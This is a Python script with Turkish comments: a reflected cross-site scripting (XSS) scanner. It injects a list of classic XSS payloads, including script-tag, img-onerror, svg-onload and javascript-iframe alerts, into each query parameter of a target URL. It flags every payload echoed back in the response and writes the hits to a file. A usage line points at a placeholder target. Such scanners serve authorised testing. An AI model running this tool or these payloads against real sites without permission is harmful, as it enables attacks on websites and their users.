import requests
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime

# Örnek payload listesi (uzatılabilir)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    # ... 50+ payload eklenebilir
]

def inject_payloads(base_url):
    results = []
    parsed = urlparse(base_url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        print("[!] URL'de test edilecek parametre bulunamadı.")
        return results

    for param in query_params:
        for payload in XSS_PAYLOADS:
            test_params = query_params.copy()
            test_params[param] = payload
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
            
            try:
                r = requests.get(test_url, timeout=5)
                if payload in r.text:
                    results.append((test_url, payload))
                    print(f"[VULNERABLE] {param} → {payload}")
            except Exception as e:
                print(f"[!] Hata: {e}")
    
    return results

def save_results(vulnerable_list, output_file):
    with open(output_file, 'w') as f:
        for url, payload in vulnerable_list:
            f.write(f"URL: {url}\nPayload: {payload}\n\n")
    print(f"\n✅ Sonuçlar kaydedildi → {output_file}")

def main():
    parser = argparse.ArgumentParser(description="XSS Scanner")
    parser.add_argument("--url", required=True, help="Test edilecek URL (param=*)")
    parser.add_argument("--output", default=f"xss_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", help="Çıktı dosyası adı")
    args = parser.parse_args()

    print(f"[🔍] Tarama Başlatılıyor: {args.url}\n")
    result = inject_payloads(args.url)
    if result:
        print(f"\n[!] Toplam {len(result)} zafiyet bulundu.")
        save_results(result, args.output)
    else:
        print("\n✅ Herhangi bir XSS zafiyeti tespit edilmedi.")

if __name__ == "__main__":
    main()


//python xss_selenium_scanner.py --url "http://hedef.com/search.php?q=*"
